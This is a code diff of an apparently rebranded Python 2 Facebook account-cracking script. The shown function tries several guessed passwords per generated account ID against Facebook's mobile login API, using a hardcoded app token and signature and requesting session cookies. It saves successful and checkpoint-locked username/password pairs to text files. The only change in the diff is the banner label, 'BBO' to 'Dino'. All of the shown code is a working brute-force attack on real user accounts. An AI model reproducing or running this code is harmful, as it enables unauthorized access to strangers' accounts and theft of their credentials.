@@ -225,14 +225,14 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m[BBO-OK]\x1b[1;92m-\x1b[1;92m \x1b[1;92m-' + k + c + user + '-\x1b[1;92m \x1b[1;92m-' + pass1																				
+				print '\x1b[1;92m[Dino-OK]\x1b[1;92m-\x1b[1;92m \x1b[1;92m-' + k + c + user + '-\x1b[1;92m \x1b[1;92m-' + pass1																				
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\x1b[1;93m[BBO-CP]\x1b[1;93m-\x1b[1;93m \x1b[1;93m-' + k + c + user + '-\x1b[1;93m \x1b[1;93m-' + pass1
+					print '\x1b[1;93m[Dino-CP]\x1b[1;93m-\x1b[1;93m \x1b[1;93m-' + k + c + user + '-\x1b[1;93m \x1b[1;93m-' + pass1
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
@@ -242,14 +242,14 @@ def action():
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                q = json.load(data)
 					if 'access_token' in q:
-		                        	print '\x1b[1;92m[BBO-OK]\x1b[1;92m-\x1b[1;92m \x1b[1;92m-' + k + c + user + '-\x1b[1;92m \x1b[1;92m-' + pass2                            											
+		                        	print '\x1b[1;92m[Dino-OK]\x1b[1;92m-\x1b[1;92m \x1b[1;92m-' + k + c + user + '-\x1b[1;92m \x1b[1;92m-' + pass2                            											
 						okb = open('save/successfull.txt', 'a')
 						okb.write(k+c+user+'|'+pass2+'\n')
 						okb.close()
 						oks.append(c+user+pass2)
 					else:	
 						if 'www.facebook.com' in q['error_msg']:
-							print '\x1b[1;93m[BBO-CP]\x1b[1;93m-\x1b[1;93m \x1b[1;93m-' + k + c + user + '-\x1b[1;93m \x1b[1;93m-' + pass2
+							print '\x1b[1;93m[Dino-CP]\x1b[1;93m-\x1b[1;93m \x1b[1;93m-' + k + c + user + '-\x1b[1;93m \x1b[1;93m-' + pass2
 							cps = open('save/checkpoint.txt', 'a')
 							cps.write(k+c+user+'|'+pass2+'\n')
 							cps.close()
@@ -259,14 +259,14 @@ def action():
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                                q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[1;92m[BBO-OK]\x1b[1;92m-\x1b[1;92m \x1b[1;92m-' + k + c + user + '-\x1b[1;92m \x1b[1;92m-' + pass3
+								print '\x1b[1;92m[Dino-OK]\x1b[1;92m-\x1b[1;92m \x1b[1;92m-' + k + c + user + '-\x1b[1;92m \x1b[1;92m-' + pass3
 								okb = open('save/successfull.txt', 'a')
 								okb.write(k+c+user+'|'+pass3+'\n')
 								okb.close()
 								oks.append(c+user+pass3)
 							else:	
 								if 'www.facebook.com' in q['error_msg']:
-									print '\x1b[1;93m[BBO-CP]\x1b[1;93m-\x1b[1;93m \x1b[1;93m-' + k + c + user + '-\x1b[1;93m \x1b[1;93m-' + pass3
+									print '\x1b[1;93m[Dino-CP]\x1b[1;93m-\x1b[1;93m \x1b[1;93m-' + k + c + user + '-\x1b[1;93m \x1b[1;93m-' + pass3
 									cps = open('save/checkpoint.txt', 'a')
 									cps.write(k+c+user+'|'+pass3+'\n')
 									cps.close()
@@ -276,14 +276,14 @@ def action():
 									data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                                                q = json.load(data)
 									if 'access_token' in q:
-										print '\x1b[1;92m[BBO-OK]\x1b[1;92m-\x1b[1;93m \x1b[1;92m-' + k + c + user + '-\x1b[1;92m \x1b[1;92m-' + pass4
+										print '\x1b[1;92m[Dino-OK]\x1b[1;92m-\x1b[1;93m \x1b[1;92m-' + k + c + user + '-\x1b[1;92m \x1b[1;92m-' + pass4
 										okb = open('save/successfull.txt', 'a')
 										okb.write(k+c+user+'|'+pass4+'\n')
 										okb.close()
 										oks.append(c+user+pass4)
 									else:
 										if 'www.facebook.com' in q['error_msg']:
-											print '\x1b[1;93m[BBO-CP]\x1b[1;93m-\x1b[1;93m \x1b[1;93m-' + k + c + user + '-\x1b[1;93m \x1b[1;93m-' + pass4
+											print '\x1b[1;93m[Dino-CP]\x1b[1;93m-\x1b[1;93m \x1b[1;93m-' + k + c + user + '-\x1b[1;93m \x1b[1;93m-' + pass4
 											cps = open('save/checkpoint.txt', 'a')
 											cps.write(k+c+user+'|'+pass4+'\n')
 											cps.close()
